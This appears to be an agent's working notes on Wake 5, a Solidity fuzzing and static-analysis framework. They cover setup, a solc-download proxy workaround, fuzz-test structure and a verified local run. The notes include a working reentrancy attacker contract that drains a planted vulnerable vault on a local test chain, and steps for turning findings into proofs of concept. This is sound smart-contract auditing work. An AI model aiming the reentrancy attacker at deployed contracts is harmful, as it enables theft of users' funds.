# Wake 5 — Python Framework for Solidity Testing, Fuzzing & Static Analysis

Wake is Ackee Blockchain's Python framework for Solidity: you write tests in
ordinary Python, it compiles the contracts, generates typed Python bindings
(`pytypes`) for every contract, and runs the tests on an EVM embedded in the
Python process (revm — no node to start). Its fuzzer is **manually guided**:
you write the moves (`@flow`, one transaction each), a Python model of what
the contract state should be, and the rules that must hold (`@invariant`);
Wake picks the order and the values, checks the invariants after every flow,
and shrinks a failing sequence to the transactions that matter. It also ships
static detectors (`wake detect`), an LSP server, and an MCP server for agents.

Official sources: github.com/AckeeBlockchain/wake (repo `ack3-ai/wake`) ·
docs at ack3.ai/wake/docs · preprint arXiv:2611.09307 ("Wake 5: A Python
Framework for Solidity Testing, Fuzzing, and Static Analysis", Gattermayer &
Převrátil) — claims 29,931 tx/s on the Daedaluzz L32 mazes, vs 30,186 for
Foundry and 2,600 for Echidna. License ISC.

## Install (verified 2026-11-22 on this VM)

Wake 5 is a release candidate: plain `pip install eth-wake` installs the
older Wake 4. Pin the 5.x RC:

```bash
python3 -m venv ~/workspace/tools/wake-venv
~/workspace/tools/wake-venv/bin/pip install eth-wake==5.0.0rc4
~/workspace/tools/wake-venv/bin/wake --version   # 5.0.0rc4
```

- Requires Python 3.10+. Never `pip install --break-system-packages` on
  the system pip — the venv above is the install.
- Venv: `~/workspace/tools/wake-venv`; binary
  `~/workspace/tools/wake-venv/bin/wake`.
- Wake downloads the solc versions a project needs on first use (see
  "solc downloads & the proxy quirk" below — on this VM that step needs
  workarounds).

## Project setup

```bash
mkdir wake-lab && cd wake-lab
~/workspace/tools/wake-venv/bin/wake up --example counter   # scaffolded example, or:
~/workspace/tools/wake-venv/bin/wake up                     # in an existing project
```

`wake up` writes `wake.toml`, compiles `contracts/`, and generates
`pytypes/` — a typed Python class per contract (autocompletion + type
checking against the Solidity code). Re-run `wake up` (or `wake up pytypes`)
after every Solidity change; `-w` keeps watching.

Minimal `wake.toml` (verified):

```toml
[compiler.solc]
target_version = "0.8.20"
```

Pinning `target_version` makes Wake use the installed solc 0.8.20 for your
files instead of re-resolving the newest version on every compile. Without
it, `wake up` force-refreshes the solc version list over the network on
every run (see the proxy quirk).

### solc downloads & the proxy quirk (verified on this VM)

Wake manages solc via `wake svm` (`list` / `install <ver>` / `use <ver>`).
Binaries + the version list live under `~/.local/share/wake/compilers/`
(`solc.json` = cached list, one directory per version).

On this VM the egress proxy **truncates** `binaries.soliditylang.org`
responses to Python's `urllib` (`IncompleteRead` after ~27–45 KB of the
48,738-byte `list.json`), while `curl` downloads the same URL fine and
`raw.githubusercontent.com` (Wake's built-in mirror) works from urllib too.
Wake tries the primary URL first and the `IncompleteRead`
(`http.client.HTTPException`) was **not** in the `except` tuple in
`wake/svm/svm.py::__fetch_list_file`, so `wake up` crashed instead of
falling through to the mirror. `wake up` always hits this path because it
compiles Wake's own bundled contracts (`wake/contracts/…`) with the latest
solc, which forces `list_all(force=True)`.

Workarounds applied (all verified working):

1. **Seed the cache with curl** (proxy-friendly), then Wake uses it offline:

```bash
mkdir -p ~/.local/share/wake/compilers/solc-linux-amd64-v0.8.20+commit.a1b79de6
curl -sS -o ~/.local/share/wake/compilers/solc.json \
  https://binaries.soliditylang.org/linux-amd64/list.json
curl -sS -o ~/.local/share/wake/compilers/solc-linux-amd64-v0.8.20+commit.a1b79de6/solc-linux-amd64-v0.8.20+commit.a1b79de6 \
  https://binaries.soliditylang.org/linux-amd64/solc-linux-amd64-v0.8.20+commit.a1b79de6
chmod 775 ~/.local/share/wake/compilers/solc-linux-amd64-v0.8.20+commit.a1b79de6/solc-linux-amd64-v0.8.20+commit.a1b79de6
# Wake's own bundled contracts compile with the newest supported solc (max 0.8.38
# in this build), so seed that one too:
mkdir -p ~/.local/share/wake/compilers/solc-linux-amd64-v0.8.38+commit.1835d247
curl -sS -o ~/.local/share/wake/compilers/solc-linux-amd64-v0.8.38+commit.1835d247/solc-linux-amd64-v0.8.38+commit.1835d247 \
  https://binaries.soliditylang.org/linux-amd64/solc-linux-amd64-v0.8.38+commit.1835d247
chmod 775 ~/.local/share/wake/compilers/solc-linux-amd64-v0.8.38+commit.1835d247/solc-linux-amd64-v0.8.38+commit.1835d247
```

Filenames come from the `releases` map in `list.json`
(`0.8.20 → solc-linux-amd64-v0.8.20+commit.a1b79de6`). Wake verifies
sha256 + keccak256 from the list before using a binary, so a bad download
is caught.
2. **One-line patch in the venv** so a truncated primary download falls
   through to the GitHub mirror instead of crashing
   (`~/workspace/tools/wake-venv/lib/python3.12/site-packages/wake/svm/svm.py`):

```python
import http.client  # add to the imports
# in __fetch_list_file, extend the except tuple:
except (urllib.error.URLError, OSError, ValidationError, http.client.HTTPException) as e:
```

   Re-apply after any `pip install -U eth-wake` (site-packages is replaced
   on upgrade). On a normal network none of this is needed — `wake svm use
   0.8.20` just works.
3. After seeding, `wake svm list` shows the installed version and
   `wake up` compiles (verified: `Compiled 10 files using 7 solc runs`).

## Writing a fuzz test

A fuzz test is a `FuzzTest` subclass. Structure (verified working):

```python
from wake.testing import *
from wake.testing.fuzzing import *
from pytypes.contracts.Vault import Vault

class VaultTest(FuzzTest):
    def pre_sequence(self) -> None:
        self.vault = Vault.deploy()
        self.model = {}          # Python model of the contract's books

    @flow()
    def deposit(self) -> None:
        who = random_account()                      # a prefunded chain account
        amount = random_int(0, 10**18)
        self.vault.deposit(value=amount, from_=who)
        self.model[who.address] = self.model.get(who.address, 0) + amount

    @flow()
    def withdraw(self) -> None:
        who = random_account()
        bal = self.vault.balances(who.address)
        if bal == 0:
            return
        self.vault.withdraw(from_=who)
        self.model[who.address] -= bal

    @invariant()
    def books_balance(self) -> None:
        assert sum(self.model.values()) == self.vault.balance

@chain.connect()
def test_vault_fuzz():
    VaultTest().run(sequences_count=10, flows_count=50)
```

Notes that cost a debugging round (all verified):

- **Use `chain.accounts[i]` for funded accounts.** `Account(i)` creates an
  empty account — sending 1 ether from it fails with
  `RuntimeError: transaction validation error: lack of funds (0)`.
  `random_account()` picks from the prefunded chain accounts.
- **Flows that would revert must return early** (the `if bal == 0: return`
  above) — a reverting flow aborts the sequence with an error instead of
  being skipped.
- **Reentrancy needs a malicious contract, not an EOA.** EOAs can't
  re-enter, so a `deposit`/`withdraw`-only fuzz can never break the
  invariant. Add an attacker contract as a flow (see the verified example
  below) with a `weight` so it runs often enough.
- `random_int(a, b)`, `random_account()`, `random_address()` etc. come from
  `wake.testing.fuzzing`. `@flow(weight=N)` biases how often a flow is
  picked; `@flow()` preconditions can be expressed by returning early.
- The model must mirror **exactly** what the contract should do — a wrong
  model produces false positives. Keep the model minimal and re-check it
  against the contract by hand before trusting a failure.

### Attacker contract (for reentrancy flows)

```solidity
// contracts/Attacker.sol
import "./Vault.sol";
contract Attacker {
    Vault public immutable vault;
    uint256 public reentries;
    constructor(Vault _vault) { vault = _vault; }
    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }
    receive() external payable {
        if (reentries < 5 && address(vault).balance > 0) {
            reentries++;
            vault.withdraw();
        }
    }
}
```

```python
@flow(weight=5)
def attacker_attack(self) -> None:
    self.attacker.attack(value=10**18, from_=chain.accounts[0])
    self.model[self.attacker.address] = self.model.get(self.attacker.address, 0) + 10**18
    # deliberately do NOT subtract the re-entered withdrawals: the invariant
    # below must catch the drain
```

## Running a campaign & reading results

```bash
~/workspace/tools/wake-venv/bin/wake test tests/test_vault.py
~/workspace/tools/wake-venv/bin/wake test tests/test_vault.py -S <seed>   # reproduce a failing run
~/workspace/tools/wake-venv/bin/wake test --cov 1 tests/test_vault.py      # statement coverage -> wake-coverage.cov
```

`wake test` is pytest underneath: `wake test tests/test_x.py::test_name`
runs one test, `-s` shows prints, `-d` drops into a debugger on failure.

On a failure Wake prints the per-flow success rates, the random seed, the
sequence/flow number, and the crash-log path, e.g.:

```
Fuzz test 'VaultTest':
  attacker_attack:  Success: 1 (2.5%)
  deposit:          Success: 20 (50.0%)
  withdraw:         Success: 19 (47.5%)
Random seed: b4b3f1c885b67321
Executed sequence number: 0
Executed flow number: 39
Crash logs:
tests/test_vault.py::test_vault_fuzz: .wake/logs/crashes/20261122_101531.json
FAILED tests/test_vault.py::test_vault_fuzz - AssertionError: books 6481702874833532423 != vault balance ~0.482 ether
```

Crash logs (`.wake/logs/crashes/*.json`) store the failing test id, the
exception, the initial random state, and the executed flow sequence — that
file plus the seed is the reproducible PoC. Re-running with `-S <seed>`
replays the exact same sequence (verified: same assertion, same flow 39).

## Verified run (2026-11-22) — planted reentrancy, found in 0.41 s

Target (`contracts/Vault.sol`, solc 0.8.20): classic reentrancy — `withdraw()`
sends ETH before `balances[msg.sender] = 0`. Lab at
`~/workspace/tools/wake-lab` (`contracts/Vault.sol`,
`contracts/Attacker.sol`, `tests/test_vault.py`).

```
$ wake test tests/test_vault.py
AssertionError: books 6481702874833532423 != vault balance ~0.482 ether (481702874833532423 wei)
FAILED tests/test_vault.py::test_vault_fuzz - AssertionError  (0.41s, sequence 0, flow 39)

$ wake test tests/test_vault.py -S b4b3f1c885b67321
FAILED ... (0.31s, same flow 39)   # seed reproduction confirmed
```

The invariant caught the drain: the books said 6.48 ETH was owed while the
vault held only 0.48 ETH — the attacker re-entered `withdraw()` and took
~6 ETH of other users' deposits.

Static cross-check (also verified): `wake detect reentrancy` flags the same
bug without running the fuzzer — `Exploitable from Vault.withdraw()`,
pointing at the `msg.sender.call{value: bal}("")` line. `wake detect all`
runs every detector; `wake detect <name>` runs one.

## Triaging a finding into a PoC

1. Re-run with the printed seed (`-S <seed>`) — if it reproduces, the
   finding is deterministic, not a flaky model.
2. Open the crash log (`.wake/logs/crashes/*.json`) and read the executed
   flows: that is the minimal exploit sequence. Translate it into a
   standalone Foundry test (deploy target + attacker, replay the calls) so
   the PoC doesn't depend on Wake — this is what goes into a report.
3. Check the model before the contract: a wrong model is the most common
   false positive. Re-derive the expected value from the contract code for
   the exact failing sequence.
4. Confirm impact is an outsider attack on funds/state (privileged-role
   paths are by-design, not bugs — see the bug rule in memory).
5. `wake detect all` as a second opinion: a detector hit on the same lines
   strengthens the finding; a clean detector run doesn't clear it (detectors
   are pattern-based).

## Limits (what it can't catch)

- **Manually guided only.** There are no automatic bug oracles: a bug your
  flows never exercise, or that no invariant constrains, is invisible. The
  fuzzer is only as good as your flows + model + invariants. (Contrast with
  ItyFuzz, which finds reentrancy with zero harness — see the `ityfuzz`
  skill.)
- The Python model is hand-written and can be wrong — a false model gives
  false positives; an incomplete model gives false negatives.
- Fuzz quality depends on flow weights and value ranges (`random_int`
  bounds); a bug needing a very specific value needs a targeted flow or a
  precondition, it won't be found by uniform randomness alone.
- No built-in onchain/fork fuzzing of a deployed contract in the verified
  flow (`chain.connect(fork=...)` exists for live-chain forking — not
  verified here; needs an RPC URL).
- Solc downloads go through Wake's own version manager (see the proxy
  quirk above) — on a restricted network, seed the cache first.
- Wake 5 is a release candidate (`5.0.0rc4` verified); APIs and the
  `wake.toml` schema may still move before stable.

## Other commands

- `wake detect all` / `wake detect <name>` — static detectors & printers.
- `wake lsp` — Solidity language server (used by the VS Code extension).
- `wake mcp` — MCP server exposing contracts, definitions, inheritance,
  storage layout, state changes, selectors and external calls to an agent.
  (Not verified end-to-end here; documented in the Wake 5 announcement.)

## Safety

Local-only. No accounts, no keys, no funds leave the machine: tests run on
the in-process revm chain with prefunded test accounts. Never point a fork
(`chain.connect(fork=...)`) at a mainnet RPC with a real key in the lab —
use a public endpoint and read-only fork mode.
